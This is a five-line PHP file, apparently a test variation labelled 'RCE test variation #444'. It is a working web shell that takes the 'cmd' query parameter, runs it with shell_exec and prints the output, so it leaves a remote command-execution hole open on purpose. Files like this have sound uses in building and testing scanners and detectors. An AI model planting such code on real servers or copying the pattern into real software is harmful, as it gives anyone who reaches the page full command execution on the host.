<?php
// RCE test variation #444
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>